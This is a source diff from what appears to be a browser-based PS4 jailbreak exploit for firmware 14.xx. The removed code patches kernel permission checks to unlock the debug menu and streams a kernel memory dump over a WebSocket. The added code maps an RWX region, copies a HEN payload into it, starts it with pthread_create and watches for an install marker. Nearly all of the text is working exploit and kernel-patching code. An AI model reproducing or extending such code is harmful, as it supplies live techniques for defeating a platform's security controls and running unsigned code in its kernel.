   iface.devs = shot.devs;
   iface.queues = shot.queues;
   if (ctx.state) ctx.state.afterglow = iface;
 
   say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");
 
-  /* straight away, not on request: in this host the process can die at any
-     moment and that is the moment this prevents */
   iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
   say(iface.defused
       ? "handles defused -- this page may close"
       : "the handles are NOT defused -- do not let this page close");
-
-  const want = (ctx.params && ctx.params.get("payload"));
-  const mode = (ctx.params && ctx.params.get("mode")) || "";
-  if (mode === "kpstep") {
-    say("[kp] diagnostic step-loader is disabled in this release");
+  if (!iface.defused) {
     iface.payload = false;
-  } else if (want !== "") {
-    iface.payload = (mode === "goldhen")
-      ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
-      : await loadPayload(want || "hen.bin");
-  }
-  /* ---- enable debug settings ---- */
-  (function () {
-    var TEXT_SIZE = 0xCFE880;
-    var DATA_OFF  = 0x1520000;
-
-    /* pass 1: find "rcmgr_debug_menu" in kernel text */
-    var c = k.begin();
-    c.hex("48bf").qw(kbase);
-    c.hex("48be").qw(plus(kbase, TEXT_SIZE));
-    c.hex("48ba").qw(v(0x676d6372, 0x65645f72));
-    c.hex("4839f7").hex("730b");
-    c.hex("483917").hex("740b");
-    c.hex("4883c701").hex("ebf0");
-    c.hex("4831c0").hex("eb03");
-    c.hex("4889f8");
-    c.hex("49ba").qw(plus(k.at, OUT));
-    c.hex("498902");
-    if (!k.run()) return;
-    var strAddr = k.out();
-    if (!strAddr || isZero(strAddr)) return;
-
-    /* verify tail bytes = "bug" */
-    var tail = k.read(plus(strAddr, 8), 8);
-    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;
-
-    /* pass 2: find oid_name pointer in data */
-    var c2 = k.begin();
-    c2.hex("48bf").qw(plus(kbase, DATA_OFF));
-    c2.hex("48be").qw(plus(kbase, DATA_OFF + 0x700000));
-    c2.hex("48ba").qw(strAddr);
-    c2.hex("4839f7").hex("730b");
-    c2.hex("483917").hex("740b");
-    c2.hex("4883c708").hex("ebf0");
-    c2.hex("4831c0").hex("eb03");
-    c2.hex("4889f8");
-    c2.hex("49ba").qw(plus(k.at, OUT));
-    c2.hex("498902");
-    if (!k.run()) return;
-    var hit = k.out();
-    if (!hit || isZero(hit)) return;
-
-    /* read handler from oid_name + 0x08 */
-    var fn = k.read_v(plus(hit, 0x08));
-    if (!fn || isZero(fn)) return;
-    var fnRva = (fn.low - kbase.low) >>> 0;
-    if (fnRva >= TEXT_SIZE) return;
-
-    /* read first 80 bytes of handler */
-    var body = k.read(fn, 80);
-    if (!body) return;
-
-    /* find first CALL (E8) followed by TEST (85) = rcmgr permission check */
-    var target = null;
-    for (var i = 0; i < body.length - 6; i++) {
-      if (body[i] === 0xe8 && body[i + 5] === 0x85) {
-        var d = body[i+1] | (body[i+2]<<8) | (body[i+3]<<16) | (body[i+4]<<24);
-        if (d >= 0x80000000) d -= 0x100000000;
-        var ct = fnRva + i + 5 + d;
-        if (ct > 0 && ct < TEXT_SIZE) {
-          target = ct;
-          say("[dbg] rcmgr check at rva 0x" + ct.toString(16));
-          break;
-        }
-      }
-    }
-
-    if (target === null) { say("[dbg] no CALL+TEST in handler"); return; }
-
-    /* also find second CALL+TEST if present */
-    var target2 = null;
-    for (var j = i + 5; j < body.length - 6; j++) {
-      if (body[j] === 0xe8 && body[j + 5] === 0x85) {
-        var d2 = body[j+1] | (body[j+2]<<8) | (body[j+3]<<16) | (body[j+4]<<24);
-        if (d2 >= 0x80000000) d2 -= 0x100000000;
-        var ct2 = fnRva + j + 5 + d2;
-        if (ct2 > 0 && ct2 < TEXT_SIZE && ct2 !== target) {
-          target2 = ct2;
-          say("[dbg] rcmgr check2 at rva 0x" + ct2.toString(16));
-          break;
-        }
-      }
-    }
-
-    /* patch: mov eax, 1; ret = B8 01 00 00 00 C3 (split into 4+2 for k.apply) */
-    var plist = [
-      [target, "b8010000", "rcmgr1a"],
-      [target + 4, "00c3", "rcmgr1b"]
-    ];
-    if (target2 !== null) {
-      plist.push([target2, "b8010000", "rcmgr2a"]);
-      plist.push([target2 + 4, "00c3", "rcmgr2b"]);
-    }
-    k.apply(kbase, plist);
-    say("debug menu enabled -- go to Settings");
-  })();
-
-  say("[dump-check] dump=" + (ctx.params ? ctx.params.get("dump") : "no-params"));
-  /* ---- kernel dumper (triggered by ?dump=kernel) ---- */
-  if (typeof location !== "undefined" && location.search.indexOf("dump=kernel") !== -1) {
-    (function () {
-      var TEXT_SIZE = 0xCFE880;
-      var DATA_OFF  = 0x1520000;
-      var DATA_SIZE = 0x6065F0;
-      var CHUNK     = 0x400;
-
-      say("[dump] opening ws://" + window.location.hostname + ":1338 ...");
-      var ws = new WebSocket("ws://" + window.location.hostname + ":1338");
-      ws.binaryType = "arraybuffer";
-
-      ws.onerror = function () { say("[dump] ws error"); };
-      ws.onclose = function () { say("[dump] ws closed"); };
-
-      ws.onopen = function () {
-        /* send header */
-        ws.send(JSON.stringify({
-          text_size: TEXT_SIZE,
-          data_off:  DATA_OFF,
-          data_size: DATA_SIZE,
-          kbase_lo:  kbase.low >>> 0,
-          kbase_hi:  kbase.hi >>> 0
-        }));
-
-        var segments = [
-          { name: "text", off: 0,        size: TEXT_SIZE },
-          { name: "data", off: DATA_OFF, size: DATA_SIZE }
-        ];
-        var seg = 0;
-        var pos = 0;
-
-        function pump() {
-          var s = segments[seg];
-          var batch = 0;
-          while (pos < s.size && batch < 128) {
-            var len = Math.min(CHUNK, s.size - pos);
-            var data = k.read(plus(kbase, s.off + pos), len);
-            if (!data) { say("[dump] read fail at " + s.name + "+0x" + pos.toString(16)); ws.send("ABORT"); ws.close(); return; }
-            var copy = new ArrayBuffer(data.length);
-            new Uint8Array(copy).set(data);
-            ws.send(copy);
-            pos += len;
-            batch++;
-          }
-          if (pos >= s.size) {
-            say("[dump] " + s.name + " done (" + s.size + " bytes)");
-            seg++;
-            pos = 0;
-            if (seg >= segments.length) {
-              ws.close();
-              say("[dump] kernel dump complete");
-              return;
-            }
-          } else {
-            var pct = Math.floor((pos * 100) / s.size);
-            say("[dump] " + s.name + " " + pct + "%");
-          }
-          setTimeout(pump, 1);
-        }
-        pump();
-      };
-    })();
+    say("[p] payload held: handles remain armed. Keep page open and cold power off");
+    return iface;
   }
 
-  say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
-      + (iface.payload ? ", enabler running" : ""));
-  say("========================================");
-  say("  JAILBREAK COMPLETE -- FW " + (host().state && host().state.fw ? host().state.fw : "14.xx"));
-  say("  Patches: " + done + "/" + patches.length);
-  say("  Debug Settings: check PS4 Settings");
-  say("========================================");
+  /* Unsupported debug-menu writes are omitted; HEN handles its core runtime. */
+
+  /* ---- Load corrected HEN payload ---- */
+  say("[p] Attempting to start corrected HEN as a thread");
+  try {
+    iface.payload = await loadPayloadShots("hen-1402-core.bin", henBytes, iface.defused);
+    iface.threadStarted = STATE.payloadThreadStarted === true;
+    iface.installed = STATE.henInstalled === true;
+    if (STATE.terminalReleaseAttempted) return iface;
+    if (iface.installed) {
+      say("[p] HEN completion marker confirmed");
+    } else if (iface.threadStarted) {
+      say("[p] HEN thread started but its completion marker was not seen");
+    } else {
+      say("[p] corrected HEN thread did not start");
+    }
+  } catch (e) {
+    iface.threadStarted = STATE.payloadThreadStarted === true;
+    iface.installed = STATE.henInstalled === true;
+    iface.payload = iface.installed;
+    iface.unknown = (STATE.pthreadCallEntered === true &&
+      STATE.pthreadCallReturned !== true) ||
+      (iface.threadStarted && !iface.installed);
+    say("[p] Error starting corrected HEN: " + (e && e.message));
+    if (iface.unknown)
+      say("[p] pthread state is unknown or incomplete -- no retry on this boot");
+  }
+
+  say("[p] HEN shot finished; kernel patches " + done + "/" + PATCHES.length +
+      "; pthread start=" + !!iface.threadStarted +
+      "; completion marker=" + (iface.installed ? "confirmed" : "not confirmed"));
   return iface;
 }
 
-/* An attempt that fell short leaves its handles live, and those are only
-   defused once step 10 is reached -- so stopping on a recoverable miss is the
-   worst of both: nothing gained, and a process that hangs when the page goes
-   away. The kernel base survives in STATE, so a second attempt skips the leak
-   and costs only triggers. A spent budget, or anything that already touched
-   the kernel, is not retried. */
-export async function runAfterglow(ctx, opts) {
-  const max = (opts && opts.tries) || 4;
-  for (let n = 1; n <= max; n++) {
-    const r = await attempt(ctx, opts);
-    if (r) return r;
-    if (!STATE.retry) return false;
-    if (n === max) { say("gave up after " + n + " attempts"); return false; }
-    say("attempt " + n + " fell short -- going again");
-    await new Promise(function (ok) { setTimeout(ok, 400); });
+/* ------------------------------------------------------- Payload Loader */
+
+async function loadPayloadShots(url, blob, defused) {
+  /* This path makes one pthread_create call. Its return only proves the
+     thread started; the completion marker is required before success. A
+     second copy would stack installers in the same kernel. */
+  return loadPayload(url, blob, defused);
+}
+
+async function fetchBytes(url, tag) {
+  try {
+    const r = await fetch(url + (url.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now());
+    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
+    return new Uint8Array(await r.arrayBuffer());
+  } catch (e) {
+    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
+    return null;
   }
-  return false;
+}
+
+function resolvePthreadCreate() {
+  const c = host();
+  if (!c.webkitBase || !c.libkernelBase || !MAPS || !MAPS.length) return null;
+
+  /* The browser's pthread_create import is the four-argument POSIX entry.
+     14.02 uses the 13.52 WebKit layout already used by the primitive. The
+     original host used this slot; verify both the slot and target against
+     the live mappings before trusting its value. dynlib_get_info does not
+     provide a base here, and stock dynlib_dlsym may deny browser callers. */
+  function mapped(at, length) {
+    const lo = at.hi * LOW + (at.low >>> 0);
+    const hi = lo + length;
+    return MAPS.some(function (m) {
+      const start = m[0].hi * LOW + (m[0].low >>> 0);
+      const end = m[1].hi * LOW + (m[1].low >>> 0);
+      return lo >= start && hi <= end;
+    });
+  }
+  const slot = plus(c.webkitBase, 0x3cb9c00);
+  if (!mapped(slot, 8)) {
+    say("[p] pthread_create import slot is outside the live WebKit map");
+    return null;
+  }
+  const fn = c.p.read8(slot);
+  const delta = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW +
+    (fn.low - (c.libkernelBase.low >>> 0));
+  if (fn.hi !== (c.libkernelBase.hi >>> 0) || delta <= 0 ||
+      delta >= 0x400000 || !mapped(fn, 16)) {
+    say("[p] pthread_create import target " + text(fn) +
+      " is outside the mapped libkernel code range");
+    return null;
+  }
+  const head = rdbuf(fn, 16);
+  if (head.every(function (byte) { return byte === 0 || byte === 0xcc; })) {
+    say("[p] pthread_create import target has no executable code");
+    return null;
+  }
+  say("[p] pthread_create import +0x3cb9c00 points to libkernel +0x" +
+    delta.toString(16));
+  return fn;
+}
+
+async function loadPayload(url, vorab, defused) {
+  const c = host();
+  STATE.payloadThreadStarted = false;
+  STATE.henInstalled = false;
+  STATE.pthreadCallEntered = false;
+  STATE.pthreadCallReturned = false;
+  let blob = vorab || null;
+  if (blob === null) {
+    blob = await fetchBytes(url, "p");
+    if (blob === null) return false;
+  }
+
+  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
+  if (blob[0] !== 0xe9) {
+    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
+    return false;
+  }
+
+  const size = (blob.length + 0x3fff) & ~0x3fff;
+  const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
+  const entry = v(m.lo, m.hi);
+  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
+    say("[p] mmap failed, errno " + c.errno()); return false;
+  }
+  let mappingLive = true;
+  const releaseUnstartedMapping = function (reason) {
+    if (!mappingLive) return true;
+    const rv = sc(S.munmap, entry, size).i32;
+    if (rv === 0) mappingLive = false;
+    else say("[p] payload mapping cleanup failed after " + reason +
+      ", errno " + c.errno());
+    return rv === 0;
+  };
+
+  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
+  say("[p] payload mapping is writable; copying final code before execution");
+
+  for (let o = 0; o < blob.length; o += 8) {
+    let lo = 0, hi = 0;
+    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
+  }
+  for (let o = 0; o < blob.length; o += 8) {
+    let lo = 0, hi = 0;
+    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+    const q = c.p.read8(plus(entry, o));
+    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
+      say("[p] copy mismatch at 0x" + o.toString(16));
+      releaseUnstartedMapping("copy mismatch");
+      return false;
+    }
+  }
+  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
+    say("[p] final mprotect rwx failed, errno " + c.errno());
+    releaseUnstartedMapping("mprotect failure");
+    return false;
+  }
+  say("[p] final payload mapping committed RW -> RWX");
+
+  say("[p] corrected HEN copied byte-for-byte and verified, starting thread");
+
+  const fn = STATE.pthread;
+  if (!fn) {
+    say("[p] pthread_create could not be resolved exactly from libkernel -- not calling it");
+    releaseUnstartedMapping("unresolved pthread_create");
+    return false;
+  }
+  if (!await checkpoint("pthread-armed", "starting corrected HEN thread")) {
+    say("[p] PC collector did not acknowledge payload start");
+    releaseUnstartedMapping("blocked pthread start");
+    return false;
+  }
+
+  const thr = alloc(8);
+  thr.u8.fill(0);
+  STATE.pthreadCallEntered = true;
+  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
+  STATE.pthreadCallReturned = true;
+  /* pthread_create's return code is the ABI success result. The pthread_t
+     representation is opaque, so never reinterpret its bit pattern as an
+     additional success condition. */
+  const started = rc === 0;
+  STATE.payloadThreadStarted = started;
+  let handleText = "unreadable";
+  try { handleText = text(qAt(thr, 0)); }
+  catch (_) { say("[p] pthread_t could not be read; pthread_create rc=" + rc); }
+  await checkpoint("pthread-returned", "rc=" + rc + " handle=" + handleText);
+  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
+      + (started ? " -- running" : " -- did NOT start"));
+  if (!started) {
+    releaseUnstartedMapping("pthread_create rejection");
+    return false;
+  }
+
+  /* HEN runs inside this WebProcess. Do not release the exploit heap or
+     navigate away until HEN's own end-of-install marker appears; the previous
+     handoff replaced the process about 50 ms after pthread_create and killed
+     the new thread before it could finish. */
+  const markerPath = cstr("/user/temp/hen.installed");
+  const wait = function (ms) {
+    return new Promise(function (resolve) { setTimeout(resolve, ms); });
+  };
+  let markerClosed = false, markerErrno = 0, elapsed = 0;
+  /* Do no ROP/syscall work for the first 30 seconds. Then observe the same
+     completion file at bounded intervals without ever starting a second
+     pthread. The additional reads only distinguish late success from an
+     unknown/unfinished installer. */
+  const markerWaits = [30000, 10000, 10000, 10000];
+  for (let i = 0; i < markerWaits.length && !STATE.henInstalled; i++) {
+    await wait(markerWaits[i]);
+    elapsed += markerWaits[i];
+    const marker = sc(S.open, markerPath.at, 0).i32;
+    if (marker >= 0) {
+      markerClosed = sc(S.close, marker).i32 === 0;
+      STATE.henInstalled = true;
+      break;
+    }
+    markerErrno = c.errno();
+    if (markerErrno !== 2) {
+      await checkpoint("HEN-MARKER-ERROR",
+        "pthread started; elapsed=" + elapsed + "ms; open errno=" + markerErrno);
+      say("[p] completion marker check failed with errno " + markerErrno +
+        "; installer state is unknown and no retry will run");
+      return false;
+    }
+    await checkpoint("HEN-MARKER-WAIT",
+      "pthread started; elapsed=" + elapsed + "ms; marker absent with ENOENT");
+  }
+
+  if (!STATE.henInstalled) {
+    await checkpoint("HEN-MARKER-TIMEOUT",
+      "pthread started; bounded checks through " + elapsed +
+      "ms were absent; errno=" + markerErrno);
+    say("[p] core installer is still unconfirmed after " + (elapsed / 1000) +
+      " seconds; no second thread was started");
+    return false;
+  }
+
+  await checkpoint("HEN-INSTALLED",
+    "/user/temp/hen.installed is present; close=" + markerClosed);
+  notifyHenRunning();
+  say("[p] core installer returned zero; completion marker and notification attempted");
+  await wait(1000);
+
+  if (defused === true && typeof c.releaseAfterPayloadStart === "function") {
+    STATE.terminalReleaseAttempted = true;
+    let released = null;
+    try {
+      released = c.releaseAfterPayloadStart({
+        payload: true, defused: true, installed: true,
+        rc: rc, handle: handleText,
+      });
+    } catch (_) {}
+    return true;
+  }
+  return true;
+}
+
+/* End of file */
+export async function runAfterglow(ctx, opts) {
+  try {
+    return await attempt(ctx, opts);
+  } finally {
+    // The exploit is one-shot. Do not keep the WebKit primitive, native-call
+    // closures, kernel interface, or shot bookkeeping alive after it returns.
+    try {
+      if (ctx && ctx.state) ctx.state.afterglow = null;
+    } catch (_) {}
+    STATE.ctx = null;
+    STATE.units = {};
+    STATE.clones = 0;
+    STATE.base = null;
+    STATE.stubs = {};
+    STATE.batch = undefined;
+    STATE.retry = false;
+    STATE.pthread = null;
+    STATE.pthreadCallEntered = false;
+    STATE.pthreadCallReturned = false;
+    STATE.taperSeed = false;
+    STATE.terminalReleaseAttempted = false;
+  }
 }
